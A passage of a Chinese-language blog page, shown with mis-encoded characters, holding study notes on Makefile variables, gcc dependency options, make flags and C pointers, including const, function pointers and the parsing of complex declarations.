å‰é¢ä½¿ç”¨å®šä¹‰çš„å˜é‡ä¸èƒ½ä½¿ç”¨è¿™ä¸ªå˜é‡, é˜²æ­¢æ­»å¾ªç¯.</p><p>é€ ç©ºæ ¼:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">space := <span class="hljs-variable">$(nullstring)</span> <span class="hljs-comment"># end of the line</span><br></code></pre></td></tr></table></figure><p>ç©ºæ ¼ä¸º <code>#</code> å‰é¢é‚£ä¸€ä¸ª.</p><p><code>?=</code> æ“ä½œç¬¦.</p><p>å¸¸è§çš„è‡ªåŠ¨å˜é‡:</p><ul><li><code>$@</code>, è¡¨ç¤ºè§„åˆ™ä¸­çš„ç›®æ ‡</li><li><code>$&lt;</code>, è¡¨ç¤ºè§„åˆ™ä¸­çš„ç¬¬ä¸€ä¸ªæ¡ä»¶</li><li><code>$?</code>, è¡¨ç¤ºè§„åˆ™ä¸­æ‰€æœ‰æ¯”ç›®æ ‡æ–°çš„æ¡ä»¶, ç»„æˆä¸€ä¸ªåˆ—è¡¨, ç”¨ç©ºæ ¼åˆ†éš”</li><li><code>$&lt;</code>, è¡¨ç¤ºè§„åˆ™ä¸­çš„æ‰€æœ‰æ¡ä»¶, ç»„æˆä¸€ä¸ªåˆ—è¡¨, ä»¥ç©ºæ ¼åˆ†éš”, å¦‚æœè¿™ä¸ªåˆ—è¡¨ä¸­æœ‰é‡å¤çš„é¡¹åˆ™å°†å…¶æ¶ˆé™¤</li></ul><p><code>:</code> ä¹‹å‰çš„æ˜¯ç›®æ ‡, ä¹‹åçš„æ˜¯æ¡ä»¶.</p><p>å˜é‡çš„å‘½åè§„åˆ™è§ä¹¦.</p><h2 id="21-4-è‡ªåŠ¨å¤„ç†å¤´æ–‡ä»¶çš„ä¾èµ–"><a href="#21-4-è‡ªåŠ¨å¤„ç†å¤´æ–‡ä»¶çš„ä¾èµ–" class="headerlink" title="21.4 è‡ªåŠ¨å¤„ç†å¤´æ–‡ä»¶çš„ä¾èµ–"></a>21.4 è‡ªåŠ¨å¤„ç†å¤´æ–‡ä»¶çš„ä¾èµ–</h2><p>gcc çš„ <code>-M</code> é€‰é¡¹è‡ªåŠ¨åˆ†æç›®æ ‡æ–‡ä»¶å’Œæºæ–‡ä»¶çš„ä¾èµ–å…³ç³», ä»¥ Makefile è§„åˆ™çš„æ ¼å¼è¾“å‡º:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc -M main.c<br></code></pre></td></tr></table></figure><p>ç”¨ <code>-MM</code> é€‰é¡¹åªä¼šè¾“å‡ºè‡ªå·±å®šä¹‰çš„å¤´æ–‡ä»¶.</p><p><a href="http://www.gnu.org/software/make/manual">GNU make å®˜æ–¹æ‰‹å†Œ</a>.</p><p><code>include $(sources:.c=.d)</code></p><h2 id="21-5-å¸¸ç”¨çš„-make-å‘½ä»¤è¡Œé€‰é¡¹"><a href="#21-5-å¸¸ç”¨çš„-make-å‘½ä»¤è¡Œé€‰é¡¹" class="headerlink" title="21.5 å¸¸ç”¨çš„ make å‘½ä»¤è¡Œé€‰é¡¹"></a>21.5 å¸¸ç”¨çš„ make å‘½ä»¤è¡Œé€‰é¡¹</h2><p><code>-n</code>, åªæ‰“å°è¦æ‰§è¡Œçš„å‘½ä»¤, è€Œä¸ä¼šçœŸçš„æ‰§è¡Œå‘½ä»¤.</p><p><code>-C</code>, åˆ‡æ¢åˆ°å¦ä¸€ä¸ªç›®å½•ä¸‹æ‰§è¡Œé‚£ä¸ªç›®å½•ä¸‹çš„ Makefile, ç¼–è¯‘å®Œæˆåä»é€€å›å…ˆå‰çš„ç›®å½•.</p><p>å¯ä»¥ä½¿ç”¨ <code>=</code> æˆ– <code>:=</code> å®šä¹‰å˜é‡.</p><p><code>-e</code>, ç”¨ç¯å¢ƒå˜é‡è¦†ç›– Makefile ä¸­å®šä¹‰çš„å˜é‡. ä½†æ˜¯ make å‘½ä»¤è¡Œé€‰é¡¹ä¸­å®šä¹‰çš„å˜é‡ä¼˜å…ˆçº§æœ€é«˜.</p><h1 id="ç¬¬22ç« -æŒ‡é’ˆ"><a href="#ç¬¬22ç« -æŒ‡é’ˆ" class="headerlink" title="ç¬¬22ç«  æŒ‡é’ˆ"></a>ç¬¬22ç«  æŒ‡é’ˆ</h1><h2 id="22-1-æŒ‡é’ˆçš„åŸºæœ¬æ¦‚å¿µ"><a href="#22-1-æŒ‡é’ˆçš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="22.1 æŒ‡é’ˆçš„åŸºæœ¬æ¦‚å¿µ"></a>22.1 æŒ‡é’ˆçš„åŸºæœ¬æ¦‚å¿µ</h2><p>ç”¨ <code>i</code> çš„åœ°å€æ¥åˆå§‹åŒ–ä¸€ä¸ªæŒ‡é’ˆå¹¶æ²¡æœ‰é”™, å› ä¸º <code>i</code> çš„åœ°å€æ˜¯åœ¨ç¼–è¯‘é“¾æ¥æ—¶ç¡®å®šçš„, ä¸éœ€è¦åˆ°è¿è¡Œæ—¶æ‰çŸ¥é“, <code>&amp;i</code> æ˜¯å¸¸é‡è¡¨è¾¾å¼.</p><p>æŒ‡é’ˆå˜é‡çš„å¤§å°å’Œå¹³å°æœ‰å…³, è‹¥æ˜¯ 32 ä½çš„è™šæ‹Ÿåœ°å€, åˆ™æŒ‡é’ˆçš„å¤§å°æ˜¯ 32 ä½, è‹¥æ˜¯ 64 ä½, åˆ™æŒ‡é’ˆä¸º 64 ä½.</p><p>å¦‚æœæŠŠå¤šä¸ªæŒ‡é’ˆå˜é‡æ”¾åœ¨ä¸€èµ·å£°æ˜, æ¯ä¸ªå˜é‡åå‰é¢éƒ½è¦æœ‰ <code>*</code>:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">int *<span class="hljs-selector-tag">a</span>, *<span class="hljs-selector-tag">b</span>;<br></code></pre></td></tr></table></figure><p>æ¯”è¾ƒå¥½çš„å†™æ³•æ˜¯å°† <code>*</code> å’Œå˜é‡åå†™åœ¨ä¸€èµ·.</p><p>æŒ‡é’ˆæœ‰æ—¶ç§°ä¸ºå˜é‡çš„å¼•ç”¨ (Reference), æ‰€ä»¥æ ¹æ®æŒ‡é’ˆæ‰¾åˆ°å˜é‡ç§°ä¸º Dereference.</p><p>ç”¨ä¸€ä¸ªæŒ‡é’ˆç»™å¦ä¸€ä¸ªæŒ‡é’ˆèµ‹å€¼æ—¶, ä¸¤ä¸ªæŒ‡é’ˆå¿…é¡»æ˜¯åŒä¸€ç±»å‹.</p><p><code>int *pi</code> å’Œ <code>char *pi</code> çš„åŒºåˆ«åœ¨ä¸: åœ¨ Dereference æ—¶å¯ä»¥è®¿é—®çš„å­—èŠ‚å¤§å°, å‰è€…ä¸º 4 ä¸ªå­—èŠ‚, åè€…ä¸º 1 ä¸ªå­—èŠ‚.</p><p>ä¸ºäº†é¿å…å‡ºç°é‡æŒ‡é’ˆ, åœ¨å®šä¹‰æŒ‡é’ˆå˜é‡æ—¶å°±åº”è¯¥æ˜ç¡®åœ°ç»™å®ƒèµ‹å€¼, æˆ–æŠŠå®ƒåˆå§‹åŒ–ä¸º <code>NULL</code>.</p><p>NULL åœ¨ C æ ‡å‡†åº“çš„å¤´æ–‡ä»¶ <code>stddef.h</code> ä¸­å®šä¹‰:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">#define <span class="hljs-built_in">NULL</span> ((<span class="hljs-literal">void</span> *)<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>æŒ‡é’ˆä¹Ÿæ˜¯ä¸€ç§æ ‡é‡ç±»å‹, å¯ä»¥ç”¨ <code>()</code> è¿ç®—ç¬¦åšå¼ºåˆ¶ç±»å‹è½¬æ¢, å…¶ä»–æ ‡é‡ç±»å‹å¯ä»¥è½¬æ¢æˆæŒ‡é’ˆç±»å‹, æŒ‡é’ˆç±»å‹ä¹Ÿå¯ä»¥è½¬æ¢æˆå…¶ä»–æ ‡é‡ç±»å‹.</p><p><code>((void *)0)</code> è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘ <code>0</code> åœ°å€, ç§°ä¸ºç©ºæŒ‡é’ˆ. ä¹Ÿå°±æ˜¯è¯´æŠŠ <code>0</code> è¿™ä¸ªæ ‡é‡è½¬æ¢ä¸º <code>void *</code> ç±»å‹, å…¶å€¼å°±è¢«å½“ä½œæ˜¯åœ°å€.</p><p>æ“ä½œç³»ç»Ÿä¸ä¼šæŠŠä»»ä½•æ•°æ®ä¿å­˜åœ¨åœ°å€ 0 åŠå…¶é™„è¿‘, ä¹Ÿä¸ä¼šæŠŠ <code>0~0xfff</code> çš„é¡µé¢æ˜ å°„åˆ°ç‰©ç†å†…å­˜. æ‰€ä»¥ä»»ä½•å¯¹ <code>0</code> åœ°å€çš„è®¿é—®ä¸€å®šä¼šå¼•å‘æ®µé”™è¯¯. ä¹Ÿå°±æ˜¯è¯´å¯¹ <code>NULL</code> æŒ‡é’ˆçš„å¼•ç”¨ä¹Ÿä¼šæŠ¥é”™. è¯•äº†ä¸€ä¸‹, åœ¨ç¼–è¯‘æ—¶ä¸ä¼šæŠ¥é”™, åœ¨è¿è¡Œæ—¶ä¼šæœ‰ <code>Segmentation fault (core dumped)</code>.</p><p><code>void *</code> ç±»å‹æ˜¯ä¸€ç§é€šç”¨æŒ‡é’ˆ, ANSI åœ¨æŠŠ C è¯­è¨€æ ‡å‡†åŒ–æ—¶å¼•å…¥çš„ <code>void *</code> ç±»å‹, è§„å®š <code>void *</code> æŒ‡é’ˆä¸å…¶ä»–ç±»å‹çš„æŒ‡é’ˆä¹‹é—´å¯ä»¥éšå¼è½¬æ¢, è€Œä¸å¿…ç”¨ <code>()</code> è¿ç®—ç¬¦å¼ºåˆ¶è½¬æ¢.</p><p><code>void *</code> æŒ‡é’ˆä¸èƒ½ç›´æ¥ Dereference, å¿…é¡»è¦å…ˆè½¬æ¢æˆåˆ«çš„ç±»å‹çš„æŒ‡é’ˆå†åš Dereference. æ ¹æ®å‰é¢å¯ä»¥çŸ¥é“, è¿™é‡Œçš„ <code>void</code> ç”¨äºåˆ¤æ–­åœ¨ Dereference æ—¶å¯ä»¥è®¿é—®çš„å†…å­˜å¤§å°, ä½†æ˜¯ <code>void</code> å¤§å°æœªçŸ¥, æ‰€ä»¥ä¸èƒ½ç›´æ¥ Dereference.</p><h2 id="22-2-æŒ‡é’ˆç±»å‹çš„å‚æ•°å’Œè¿”å›å€¼"><a href="#22-2-æŒ‡é’ˆç±»å‹çš„å‚æ•°å’Œè¿”å›å€¼" class="headerlink" title="22.2 æŒ‡é’ˆç±»å‹çš„å‚æ•°å’Œè¿”å›å€¼"></a>22.2 æŒ‡é’ˆç±»å‹çš„å‚æ•°å’Œè¿”å›å€¼</h2><h2 id="22-3-æŒ‡é’ˆä¸æ•°ç»„"><a href="#22-3-æŒ‡é’ˆä¸æ•°ç»„" class="headerlink" title="22.3 æŒ‡é’ˆä¸æ•°ç»„"></a>22.3 æŒ‡é’ˆä¸æ•°ç»„</h2><p>åç¼€è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§é«˜äºå•ç›®è¿ç®—ç¬¦, æ‰€ä»¥ <code>&amp;a[0]</code> æ˜¯å– <code>a[0]</code> çš„åœ°å€è€Œä¸æ˜¯å– <code>a</code> çš„åœ°å€.</p><p>äº‹å®ä¸Š, <code>E1[E2]</code> è¿™ç§å†™æ³•å’Œ <code>(*((E1) + (E2)))</code> æ˜¯ç­‰ä»·çš„.</p><p>å…¶å®å¯¹äº <code>*</code> å’Œ <code>[]</code> è¿ç®—ç¬¦æ¥è¯´, æ•°ç»„ç±»å‹å’ŒæŒ‡é’ˆæ˜¯ç»Ÿä¸€çš„.</p><p>C è¯­è¨€è§„å®š, åªæœ‰æŒ‡å‘åŒä¸€ä¸ªæ•°ç»„ä¸­çš„å…ƒç´ çš„æŒ‡é’ˆä¹‹é—´ä¸‹æ˜‚èƒ¡æ¯”è¾ƒæ‰æœ‰æ„ä¹‰, å¦åˆ™éƒ½æ˜¯ <code>Undefined</code>.</p><p>æŒ‡é’ˆç›¸å‡çš„ç»“æœæ˜¯ <code>ptrdiff_t</code> ç±»å‹, è¿™ä¸ªç±»å‹ååœ¨ <code>stddef.h</code> ä¸­å®šä¹‰, æ˜¯ä¸€ç§æœ‰ç¬¦å·æ•´å‹.</p><p>æ•°ç»„ç±»å‹åšå·¦å€¼æ—¶è¡¨ç¤ºæ•´ä¸ªæ•°ç»„çš„å­˜å‚¨ç©ºé—´. ä¹Ÿå°±æ˜¯è¯´ <code>a[1]</code> æ­¤æ—¶ä¸æ˜¯ <code>*(a + 1)</code> (è¿™é‡Œçš„ <code>*</code> è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæŒ‡é’ˆç±»å‹), è€Œæ˜¯ <code>*(*(a + 1))</code>, å³åœ¨è¿™ä¸ªåœ°å€ä¸Šå­˜çš„å€¼.</p><p>å‡½æ•°åŸå‹ä¸­å‚æ•°å¯ä»¥å†™æˆ:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a[<span class="hljs-number">10</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>ç­‰ä»·äº:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> *a)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a[])</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæ–¹æ‹¬å·ä¸­çš„æ•°å­—å¯ä»¥ä¸å†™.</p><h2 id="22-4-æŒ‡é’ˆä¸-const-é™å®šç¬¦"><a href="#22-4-æŒ‡é’ˆä¸-const-é™å®šç¬¦" class="headerlink" title="22.4 æŒ‡é’ˆä¸ const é™å®šç¬¦"></a>22.4 æŒ‡é’ˆä¸ const é™å®šç¬¦</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">const</span> <span class="hljs-built_in">int</span> *a;<br><span class="hljs-built_in">int</span> <span class="hljs-keyword">const</span> *a;<br></code></pre></td></tr></table></figure><p>ä¸¤è€…ç­‰ä»·, è¡¨ç¤º a æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>const int</code> å‹çš„æŒ‡é’ˆ.</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> * <span class="hljs-keyword">const</span> a;<br></code></pre></td></tr></table></figure><p>è¡¨ç¤º a æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>int</code> çš„ <code>const</code> æŒ‡é’ˆ.</p><p>è‰¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯åº”è¯¥å°½å¯èƒ½å¤šä½¿ç”¨ <code>const</code> é™å®šç¬¦.</p><p>gcc æŠŠå­—ç¬¦ä¸²å­—é¢å€¼åˆ†é…åœ¨ <code>.rodata</code> æ®µ, åœ¨è¿è¡Œæ—¶æ”¹å†™ä¼šå‡ºç°æ®µé”™è¯¯, æ‰€ä»¥å­—ç¬¦ä¸²å­—é¢å€¼åšå³å€¼æ—¶æœ€å¥½ç†è§£æˆ <code>const char*</code> å‹.</p><h2 id="22-5-æŒ‡é’ˆä¸ç»“æ„ä½“"><a href="#22-5-æŒ‡é’ˆä¸ç»“æ„ä½“" class="headerlink" title="22.5 æŒ‡é’ˆä¸ç»“æ„ä½“"></a>22.5 æŒ‡é’ˆä¸ç»“æ„ä½“</h2><p><code>(*p).c</code> å’Œ <code>(*p).num</code> å¯ä»¥å†™æˆ <code>p-&gt;c</code> å’Œ <code>p-&gt;num</code>.</p><h2 id="22-6-æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆä¸æŒ‡é’ˆæ•°ç»„"><a href="#22-6-æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆä¸æŒ‡é’ˆæ•°ç»„" class="headerlink" title="22.6 æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆä¸æŒ‡é’ˆæ•°ç»„"></a>22.6 æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆä¸æŒ‡é’ˆæ•°ç»„</h2><p><code>int *a[10]</code> è¿™ç§å°±æ˜¯ <mark>æŒ‡é’ˆæ•°ç»„</mark> , åç¼€è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§æ›´é«˜, æ‰€ä»¥ <code>a</code> é¦–å…ˆæ˜¯ä¸€ä¸ªæ•°ç»„.</p><p><code>char *argv[]</code> æŒ‡å‘çš„å‘½ä»¤è¡Œå‚æ•°åä¸€ä¸ªæŒ‡é’ˆæ˜¯ <code>NULL</code>.</p><p>å¦‚æœç»™ç¨‹åºå»ºç«‹ç¬¦å·é“¾æ¥, ç„¶åé€šè¿‡ç¬¦å·é“¾æ¥è¿è¡Œè¿™ä¸ªç¨‹åº, å°±å¯ä»¥å¾—åˆ°ä¸åŒçš„ <code>argv[0]</code>.</p><p>å…³äº busybox, è¿™æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶, å®‰è£…æ—¶ä¼šå°† busybox ç¨‹åºå¤åˆ¶åˆ°åµŒå…¥å¼ç³»ç»Ÿçš„ <code>/bin</code> ç›®å½•ä¸‹, åŒæ—¶åœ¨ <code>/bin</code>, <code>/sbin</code>, <code>/usr/bin</code>, <code>/usr/sbin</code> ç­‰ç›®å½•ä¸‹åˆ›å»ºå¾ˆå¤šæŒ‡å‘ <code>/bin/busybox</code> çš„ç¬¦å·é“¾æ¥, å‘½åä¸º cp, ls, mv, ifconfig ç­‰, ä¸ç®¡æ‰§è¡Œå“ªä¸ªå‘½ä»¤å…¶å®æœ€ç»ˆéƒ½åœ¨æ‰§è¡Œ <code>/bin/busybox</code>, å®ƒä¼šæ ¹æ® <code>argv[0]</code> æ¥æ‰®æ¼”ä¸åŒçš„å‘½ä»¤.</p><p>åœ¨ gdb è°ƒè¯•æ—¶åŠ å…¥å‘½ä»¤è¡Œå‚æ•°, å¯ä»¥åœ¨ run æˆ– start å‘½ä»¤ä¹‹ååŠ å…¥, ä¹Ÿå¯ä»¥ç”¨ <code>set args</code> å‘½ä»¤è®¾ç½®å‘½ä»¤è¡Œå‚æ•°ä¹‹åå†è°ƒç”¨ run æˆ– start è¿è¡Œç¨‹åº.</p><p>æŒ‡é’ˆçš„åˆ†æä»å³å¾€å·¦.</p><h2 id="22-7-æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆä¸å¤šç»´æ•°ç»„"><a href="#22-7-æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆä¸å¤šç»´æ•°ç»„" class="headerlink" title="22.7 æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆä¸å¤šç»´æ•°ç»„"></a>22.7 æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆä¸å¤šç»´æ•°ç»„</h2><p>æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆ:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int (*a)[<span class="hljs-number">10</span>] <span class="hljs-operator">=</span> NULL<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="22-8-å‡½æ•°ç±»å‹å’Œå‡½æ•°æŒ‡é’ˆ"><a href="#22-8-å‡½æ•°ç±»å‹å’Œå‡½æ•°æŒ‡é’ˆ" class="headerlink" title="22.8 å‡½æ•°ç±»å‹å’Œå‡½æ•°æŒ‡é’ˆ"></a>22.8 å‡½æ•°ç±»å‹å’Œå‡½æ•°æŒ‡é’ˆ</h2><p>åœ¨ C è¯­è¨€ä¸­, å‡½æ•°ä¹Ÿæ˜¯ä¸€ç§ç±»å‹, å¯ä»¥å®šä¹‰æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆ.</p><p>å‡½æ•°æŒ‡é’ˆçš„å†…å­˜å•å…ƒé‡Œå­˜æ”¾çš„æ˜¯å‡½æ•°çš„å…¥å£åœ°å€ (ä½äº <code>.text</code> æ®µ).</p><p>åˆ†æ <code>void (*f)(const char *)</code>, <code>f</code> é¦–å…ˆè·Ÿ <code>*</code> ç»“åˆåœ¨ä¸€èµ·, å› æ­¤æ˜¯ä¸€ä¸ªæŒ‡é’ˆ. <code>(*f)</code> å¤–é¢æ˜¯ä¸€ä¸ªå‡½æ•°åŸå‹çš„æ ¼å¼, å‚æ•°æ˜¯ <code>const char *</code>, è¿”å›å€¼æ˜¯ <code>void</code>.</p><p>å‡½æ•°ç±»å‹å’Œæ•°ç»„ç±»å‹ç›¸ä¼¼, åšå³å€¼ä½¿ç”¨æ—¶è‡ªåŠ¨è½¬æ¢æˆå‡½æ•°æŒ‡é’ˆç±»å‹.</p><p><mark>æ•°ç»„å–ä¸‹æ ‡è¿ç®—ç¬¦ <code>[]</code> è¦æ±‚æ“ä½œæ•°æ˜¯æŒ‡é’ˆç±»å‹</mark>. <code>a[1]</code> ç­‰ä»·äº <code>*(a+1)</code>, å¦‚æœ a æ˜¯æ•°ç»„ç±»å‹åˆ™è¦è‡ªåŠ¨è½¬æ¢æˆæŒ‡å‘é¦–å…ƒç´ çš„æŒ‡é’ˆç±»å‹.</p><p>è¦åŒºåˆ†å‡½æ•°ç±»å‹å’Œå‡½æ•°æŒ‡é’ˆç±»å‹.</p><p>ä»¥ä¸‹ä¸ºå®šä¹‰å‡½æ•°ç±»å‹:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-title">fn</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹ä¸ºå®šä¹‰å‡½æ•°æŒ‡é’ˆ:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span> (*fp)(<span class="hljs-built_in">void</span>);<br></code></pre></td></tr></table></figure><h2 id="22-9-ä¸å®Œå…¨ç±»å‹å’Œå¤æ‚å£°æ˜"><a href="#22-9-ä¸å®Œå…¨ç±»å‹å’Œå¤æ‚å£°æ˜" class="headerlink" title="22.9 ä¸å®Œå…¨ç±»å‹å’Œå¤æ‚å£°æ˜"></a>22.9 ä¸å®Œå…¨ç±»å‹å’Œå¤æ‚å£°æ˜</h2><p>C è¯­è¨€çš„ç±»å‹åˆ†ä¸ºå‡½æ•°ç±»å‹, å¯¹è±¡ç±»å‹å’Œä¸å®Œå…¨ç±»å‹ä¸‰å¤§ç±». å¯¹è±¡ç±»å‹åˆåˆ†ä¸ºæ ‡é‡ç±»å‹å’Œéæ ‡é‡ç±»å‹. ä¸å®Œå…¨ç±»å‹æ˜¯æš‚æ—¶æ²¡æœ‰å®Œå…¨å®šä¹‰å¥½çš„ç±»å‹, ç¼–è¯‘å™¨ä¸çŸ¥é“è¿™ç§ç±»å‹è¯¥å å‡ ä¸ªå­—èŠ‚çš„å­˜å‚¨ç©ºé—´. å¦‚:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">s</span>;<br><span class="hljs-keyword">union</span> <span class="hljs-title class_">u</span>;<br><span class="hljs-type">char</span> <span class="hljs-type">str</span>[];<br></code></pre></td></tr></table></figure><p>åœ¨åˆ†æå¤æ‚å£°æ˜æ—¶, è¦å€ŸåŠ© <code>typedef</code> æŠŠå¤æ‚å£°æ˜åˆ†è§£æˆå‡ ç§åŸºæœ¬å½¢å¼.</p><ul><li><code>T *p;</code> p æ˜¯æŒ‡å‘ T ç±»å‹çš„æŒ‡é’ˆ</li><li><code>T a[];</code> a æ˜¯ç”± T ç±»å‹çš„å…ƒç´ ç»„æˆçš„æ•°ç»„, ä½†æœ‰ä¸€ä¸ªä¾‹å¤–, å¦‚æœ a æ˜¯å‡½æ•°çš„å½¢å‚, åˆ™ç›¸å½“äº <code>T *a</code></li><li><code>T1 f(T2, T3...);</code> f æ˜¯ä¸€ä¸ªå‡½æ•°, å‚æ•°ç±»å‹æ˜¯ T2, T3 ç­‰, è¿”å›å€¼ç±»å‹æ˜¯ T1</li></ul><p>ä¹¦ä¸­ä¾‹å­: <code>int (*(*fp)(void *))[10];</code>.</p><p>æˆ‘ä»¬é¦–å…ˆæ‰¾åˆ° name, ä¹Ÿå°±æ˜¯ <code>fp</code>, è¿™é‡Œå®ƒå‰é¢æœ‰ä¸€ä¸ª <code>*</code>, å³ <code>*fp</code>, è¯´æ˜è¿™ä¸€é•¿ä¸²æœ€ç»ˆè‚¯å®šæ˜¯ä¸€ä¸ªæŒ‡é’ˆ, ä½†æˆ‘ä»¬çœ‹åˆ°è¿”å›å€¼æå…¶å¤æ‚ä¸ä¾¿åˆ†æ, ç”±æ­¤æš‚å®šä¸º <code>T1</code>, å› æ­¤å¯ä»¥ç®€åŒ–ä¸º:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">typedef int <span class="hljs-comment">(*T1(void *)</span>)[<span class="hljs-number">10</span>];<br>T1 *fp;<br></code></pre></td></tr></table></figure><p>ç›¸å½“äº <code>*fp</code> è¢«æ›¿æ¢ä¸ºäº† <code>T1</code>.</p><p>æ¥ç€åˆæ‰¾ name, ä¹Ÿå°±æ˜¯ <code>T1</code>, å…¶å…ˆå’Œ <code>(void *)</code> ç»“åˆ (åç¼€è¿ç®—ç¬¦), å› æ­¤ <code>T1</code> æ˜¯ä¸€ä¸ªå‡½æ•°ç±»å‹, ä»ç„¶è¦æ©ç›–è¿”å›å€¼çš„å¤æ‚, å› æ­¤å®šä¸º <code>T2</code>:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs delphi">typedef int <span class="hljs-comment">(*T2)[10];</span><br><span class="hljs-comment">typedef T2 T1(void *)</span>;<br>T1 *fp;<br></code></pre></td></tr></table></figure><p>åˆçœ‹è¿™é‡Œç¬¬ä¸€ä¸ª <code>typedef</code>, è¿™é‡Œ <code>T2</code> å…ˆä¸ <code>*</code> ç»“åˆ, è¯´æ˜å…¶ä¸ºæŒ‡é’ˆ, æŒ‡å‘ <code>T3</code> ç±»å‹:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">typedef int <span class="hljs-built_in">T3</span>[<span class="hljs-number">10</span>]<br>typedef <span class="hljs-built_in">T3</span> *<span class="hljs-built_in">T2</span><span class="hljs-comment">;         // T2 è¡¨ç¤ºæŒ‡å‘ T3 ç±»å‹çš„æŒ‡é’ˆ</span><br>typedef <span class="hljs-built_in">T2</span> <span class="hljs-built_in">T1</span>(void *)<br><span class="hljs-built_in">T1</span> *<span class="hljs-built_in">fp</span>;<br></code></pre></td></tr></table></figure><p>ç»¼åˆä¸€ä¸‹å°±æ˜¯, <code>fp</code> æ˜¯ä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªå‡½æ•°ç±»å‹(å‚æ•°ä¸º <code>void *</code> è¿”å›å€¼æ˜¯æŒ‡å‘å«æœ‰ 10 ä¸ªå…ƒç´ çš„æ•°ç»„çš„æŒ‡é’ˆ)çš„æŒ‡é’ˆ.</p><p>æ€»ç»“ç»éªŒ, æ‰¾ name å¾ˆé‡è¦, é€šè¿‡ä¼˜å…ˆçº§æ‰¾åˆ°ç¬¦åˆåŸºæœ¬ç±»å‹çš„æ¡ä»¶åå¼€å§‹ç”¨ <code>typedef</code> æ›¿æ¢.</p><p>å®ä¾‹ç»ƒä¹ , <code>char (*(*x(void))[3])(void)</code></p><p>é¦–å…ˆ name ä¸º <code>x</code>, å…¶å’Œ <code>(void)</code> ç»“åˆ, è¡¨æ˜å…¶ä¸ºå‡½æ•°ç±»å‹, è¿”å›å€¼ä¸º <code>T1</code>:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 